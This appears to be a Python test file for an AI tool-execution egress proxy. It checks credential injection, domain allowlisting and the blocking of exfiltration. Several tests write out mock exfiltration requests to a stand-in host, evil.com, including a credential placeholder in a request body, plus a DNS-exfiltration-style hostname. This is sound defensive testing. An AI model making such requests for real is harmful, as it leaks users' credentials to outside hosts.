"""M3 egress proxy and credential injection tests."""

from __future__ import annotations

from shisad.core.types import CredentialRef
from shisad.executors.proxy import EgressProxy, NetworkPolicy
from shisad.security.credentials import CredentialConfig, InMemoryCredentialStore


def _public_resolver(_hostname: str) -> list[str]:
    return ["93.184.216.34"]


def test_m3_proxy_injects_placeholder_for_allowed_host() -> None:
    store = InMemoryCredentialStore()
    store.register(
        CredentialRef("gmail_primary"),
        "super-secret-token",
        CredentialConfig(allowed_hosts=["api.good.com"]),
    )
    placeholder = store.get_placeholder(CredentialRef("gmail_primary"))
    proxy = EgressProxy(credential_store=store, resolver=_public_resolver)
    decision = proxy.authorize_request(
        tool_name="http_request",
        url="https://api.good.com/v1/send",
        policy=NetworkPolicy(allow_network=True, allowed_domains=["api.good.com"]),
        headers={"Authorization": placeholder},
        approved_by_pep=True,
    )
    assert decision.allowed is True
    assert decision.injected_headers["Authorization"] == "super-secret-token"


def test_m3_proxy_blocks_host_not_in_allowlist() -> None:
    proxy = EgressProxy(resolver=_public_resolver)
    decision = proxy.authorize_request(
        tool_name="http_request",
        url="https://evil.com/push",
        policy=NetworkPolicy(allow_network=True, allowed_domains=["api.good.com"]),
    )
    assert decision.allowed is False
    assert decision.reason == "host_not_allowlisted"


def test_m3_proxy_blocks_credential_injection_for_non_allowed_host() -> None:
    store = InMemoryCredentialStore()
    store.register(
        CredentialRef("gmail_primary"),
        "super-secret-token",
        CredentialConfig(allowed_hosts=["api.good.com"]),
    )
    placeholder = store.get_placeholder(CredentialRef("gmail_primary"))
    proxy = EgressProxy(credential_store=store, resolver=_public_resolver)
    decision = proxy.authorize_request(
        tool_name="http_request",
        url="https://evil.com/push",
        policy=NetworkPolicy(allow_network=True, allowed_domains=["evil.com"]),
        headers={"Authorization": placeholder},
        approved_by_pep=True,
    )
    assert decision.allowed is False
    assert decision.reason == "credential_host_mismatch"
    assert decision.alert is True


def test_m3_proxy_blocks_placeholder_exfiltration_in_body() -> None:
    store = InMemoryCredentialStore()
    store.register(
        CredentialRef("gmail_primary"),
        "super-secret-token",
        CredentialConfig(allowed_hosts=["api.good.com"]),
    )
    placeholder = store.get_placeholder(CredentialRef("gmail_primary"))
    proxy = EgressProxy(credential_store=store, resolver=_public_resolver)
    decision = proxy.authorize_request(
        tool_name="http_request",
        url="https://evil.com/collect",
        policy=NetworkPolicy(allow_network=True, allowed_domains=["evil.com"]),
        body=f"dump={placeholder}",
        approved_by_pep=True,
    )
    assert decision.allowed is False
    assert decision.reason == "placeholder_exfiltration_blocked"
    assert decision.alert is True


def test_m3_proxy_blocks_dns_exfiltration_like_hostnames() -> None:
    proxy = EgressProxy(resolver=_public_resolver)
    long_label = "a7f" * 24  # 72 chars
    decision = proxy.authorize_request(
        tool_name="http_request",
        url=f"https://{long_label}.api.good.com/submit",
        policy=NetworkPolicy(allow_network=True, allowed_domains=["*.api.good.com"]),
    )
    assert decision.allowed is False
    assert decision.reason == "dns_exfil_suspected"
